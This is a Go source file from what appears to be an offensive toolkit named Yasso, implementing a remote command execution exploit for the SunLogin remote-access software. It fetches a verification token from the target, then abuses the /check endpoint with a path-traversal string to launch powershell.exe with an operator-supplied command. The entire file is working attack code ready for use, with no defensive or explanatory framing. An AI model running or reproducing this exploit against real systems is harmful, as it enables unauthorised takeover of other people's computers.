package sunlogin

import (
	"Yasso/core/logger"
	"Yasso/pkg/exploit/config"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"time"
)

func ExploitSunLogin(exploits config.Exploits, Command string) {
	addr := fmt.Sprintf("%v:%v", exploits.Hostname, exploits.Port)
	verify := getVerify(addr)
	if Command != "" {
		re := runCmd(Command, addr, verify)
		if re == "" {
			logger.Fatal(fmt.Sprintf("exploit %s failed", addr))
			return
		} else {
			logger.Info(re)
		}
	} else {
		logger.Fatal("exploit need command params")
		return
	}
}

func getVerify(addr string) string { //获取Verify认证
	resp, err := http.Get(fmt.Sprintf("http://%s/cgi-bin/rpc?action=verify-haras", addr))
	if err != nil {
		return ""
	}
	b, _ := io.ReadAll(resp.Body)
	reg := regexp.MustCompile(`"verify_string":"(.*?)"`)
	result := reg.FindAllSubmatch(b, 1)
	if len(result) > 0 {
		if len(result[0]) == 2 {
			return string(result[0][1])
		}
	}
	return ""
}
func runCmd(cmd string, addr string, verify string) string {
	cmd = url.QueryEscape(cmd)
	target := "http://" + addr + `/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+` + cmd
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return ""
	}
	req.Header.Add("Cookie", "CID="+verify)
	var client = http.DefaultClient
	client.Timeout = 5 * time.Second
	resp, _ := client.Do(req)
	if err != nil || resp == nil {
		return ""
	} else {
		str, _ := io.ReadAll(resp.Body)
		str, _ = simplifiedchinese.GBK.NewDecoder().Bytes(str)
		//fmt.Println(string(str))
		return string(str)
	}
}
